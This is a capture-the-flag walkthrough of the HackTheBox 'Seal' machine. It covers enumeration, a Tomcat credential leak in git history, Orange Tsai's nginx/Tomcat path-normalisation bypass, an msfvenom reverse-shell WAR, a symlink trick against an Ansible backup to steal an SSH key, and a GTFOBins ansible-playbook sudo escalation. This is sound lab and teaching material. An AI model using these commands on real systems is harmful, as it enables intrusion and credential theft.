# Machine information

Seal is very entertaining machine. First discovering Vhost of the machine and running `ffuf` against it showed few directories that were used in Apache Tomcat server. Another Service is running on port 8080, Gitbucket, after signing on the portal gave 2 repositories, in one of the repository's commit had credentials for `tomcat` user, but tomcat login portal is being blocked by nginx configuration that are coded in the repository. To access the portal, `tomcat` and `nginx` has a flaw which was explained and how to exploit it in great BlackHat talk by OrangeTsai - Breaking the Parser. After abusing the flaw and uploading malicious `war` file and getting shell as `tomcat` user, I discovered some interesting files of Ansible Playbook, an Automation engine, I will abuse the playbook to get to `luis` user and after that I will exploit `sudo` capability of the `luis` user to get to `root` user.

# Enumeration

## nmap

As always I will scan for all the open ports with `nmap`  which is highly revered network scanning tool in the inforsec community.

Starting nmap with full port scanning without detecting services and storing the results into **all** file prepending with flag -oA. 

* `-p-` : Specifies All ports 0-65535 
* `-oA` : To print output into files with extensions gnmap,xml,nmap, Here A stands for All. 
* `--min-rate=` : When the --min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,

```bash
$_ sudo nmap -p- -oA nmap/all 10.10.10.250 --min-rate=10000

Nmap scan report for 10.10.10.250
Host is up (0.30s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 360.50 seconds
```

Now I scan them to identify running services and nmap pre-installed scripts using `-sV` and `-sC` flags respectively

```bash
$_ sudo nmap -sC -sV -p 22,443,8080 -oA nmap/all 10.10.10.250

# Nmap 7.92 scan initiated Wed Nov 17 19:47:20 2021 as: nmap -sC -sV -p 22,443,8080 -oA nmap/all 10.10.10.250
Nmap scan report for 10.10.10.250
Host is up (0.21s latency).

```

nmap gave hostname which I will add to my hostfile `/etc/hosts`

> 10.10.10.250	seal seal.htb

what nmap did not gave me is an email address, After running nmap I checked the certificate file of the host. I will remember this just in case.

## Visiting Port 443

This how the website looks like, there aren't any interesting directories listed. 

<img src="/image/hackthebox/seal/03.png" alt="03" style="zoom:67%;" />

I ran `ffuf` in the backgroud. ffuf is an fuzzing tool to look for any hidden directories.

``` bash
$_ ffuf -u https://seal.htb/FUZZ -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]

```

After visiting `/admin` it was revealed to me that this is an Apache Tomcat 9.0.31 server. It is showing 404 for `/admin` and `/cmd` pages except it is showing 403 for`/manager`.

## Gitbucket

There is also 8080 port open serving GitBucket. I signed up as `amroot` user and logged in.

<img src="/image/hackthebox/seal/05.png" alt="05" style="zoom:80%;" />

There are 2 repositories listed. Opening them revealed some usernames.

> root
> luis
> alex

Firstly, I looking at the `seal_market` respository. It is using `nginx` and `tomcat` servers. While looking at the commits, on commit `ac210325afd2f6ae17cce84a8aa42805ce5fd010` there are tomcat credentials added.

![06](/image/hackthebox/seal/06.png)

On the next commit `971f3aa3f0a0cc8aac12fd696d9631ca540f44c7` it was deleted. I don't have access to login portal so I have to find a way to it.

In the `seal_market` latest commit `db85dc0136b335d873a07420aa8963491c6cd362` mentioned a ToDo list.

> - Remove mutual authentication for dashboard, setup registration and login features.
> - Deploy updated tomcat configuration.
> - Disable manager and host-manager.

Looking at commit information nginx configurations has been changed.

<img src="/image/hackthebox/seal/07.png" alt="07" style="zoom:80%;" />

After looking at the code, I googled for `nginx mutual authentication` and also because the server is nginx which I got from response header.

> Server: nginx/1.18.0 (Ubuntu)

This [blog post](https://smallstep.com/hello-mtls/doc/server/nginx) explains how to setup mutual auhentication in nginx server. 

After this I googled for `nginx tomcat exploit`, now there is a good blackhat talk from OrangeTsai '[Breaking the Parser](https://www.youtube.com/watch?v=28xWcRegncw)' which explains POC on exploitation. This is the [white paper](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) for the talk.

# Shell as Tomcat

I used `/foo;name=orange/bar/` payload from the talk changed it `/manager;name=orange/html` which prompted the login.

![08](/image/hackthebox/seal/08.png)

I entered the creds which I found on commit and successfully logged in as tomcat user.

<img src="/image/hackthebox/seal/09.png" alt="09" style="zoom: 50%;" />

I will just deploy malicious reverse shell war file using `msfvenom`. I used following command to create a war file.

> msfvenom -p java/shell_reverse_tcp lhost=10.10.14.120 lport=9001 -f war -o amroot.war

I will deploy the file and that gave me a reverse shell.

<img src="/image/hackthebox/seal/10.png" alt="10" style="zoom:80%;" />

I upgraded my shell for better environment.

# Shell as Luis

## Discovering Ansible Playbook

Now that I have proper envinronment. I started looking for interesting files and I came across Ansible directory in `/opt/backups`.

<img src="/image/hackthebox/seal/12.png" alt="12" style="zoom:80%;" />

What is [Ansible Playbook](https://docs.ansible.com/ansible/latest/user_guide/playbooks_intro.html)? 

Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the [ansible-examples repository](https://github.com/ansible/ansible-examples) illustrate many useful techniques. You may want to look at these in another tab as you read the documentation.

Playbooks can:

- declare configurations
- orchestrate steps of any manual ordered process, on multiple sets of machines, in a defined order
- launch tasks synchronously or [asynchronously](https://docs.ansible.com/ansible/latest/user_guide/playbooks_async.html#playbooks-async)

The Playbooks are written in YAML languange.

In the `playbook` directory there is only 1 file `run.yml`.

```bash
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
    	path: /opt/backups/files/
    	dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
        state: absent
        path: /opt/backups/files/
```



There Are 3 tasks being run.

1. Copy files is copying files from  `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` to `/opt/backups/files` folder using [`synchronize`](https://docs.ansible.com/ansible/2.5/modules/synchronize_module.html) module and  `copy_symlink` what is important here.
2. Archive those files using [`archive`](https://docs.ansible.com/ansible/2.5/modules/archive_module.html#archive-module) module into `/opt/backups/archives/backup-{timestamps}.gz` 
3. Lastly delete folder ` /opt/backups/files/` using [`File`](https://docs.ansible.com/ansible/2.5/modules/archive_module.html#archive-module) module's `state=absent` parameter.

## Abusing Ansible

I can abuse this `copy_symlink` parameter.

> Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink.

Firstly I have to find a writtable location inside `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` folder.

![13](/image/hackthebox/seal/13.png)

There is `/uploads` folder where I can write. Also in the `archives` folder is being written every 1 min.

![14](/image/hackthebox/seal/14.png)

I can just "write" files from `/home/luis/.ssh/id_rsa` and playbook will do its thing.  

```bash
ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```

Before `*.gz` files were `606047` bytes and now after symlinking new gerenerated file was `608923` bytes, looks like it worked!

![15](/image/hackthebox/seal/15.png)

I transferred the `backup.gz` file on my ParrotOS and after extracting reveals `id_rsa` inside `uploads` directory. I will use this file to get ssh shell as `luis` user using `ssh -i id_rsa luis@seal`. 

![17](/image/hackthebox/seal/17.png)

# Shell as root

## Abusing sudo -l

Getting root user was extremly easy. First thing I ran after getting shell as `luis` was `sudo -l` to look for any files I can run as `root` user.

> luis@seal:~$ sudo -l                                                                                                                                                                          
> Matching Defaults entries for luis on seal:                                                                                                                                                   
>  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                                                                            
> User luis may run the following commands on seal:                                                                                                                                           
>  (ALL) NOPASSWD: /usr/bin/ansible-playbook * 

I wrote small playbook from to ping back.

![20](/image/hackthebox/seal/20.png)

After running the script I got ping from `seal`

![19](/image/hackthebox/seal/19.png)

## GTFObins POC

I can run `ansible-playbook` binary as `root` user, I quickly jumped to [GTFObins](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo) which showed following commands to get as `root`. I created `root.sh` file and transfered that file over to target machine.

```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
```



After running file `bash root.sh` I was escalated to `root` user.
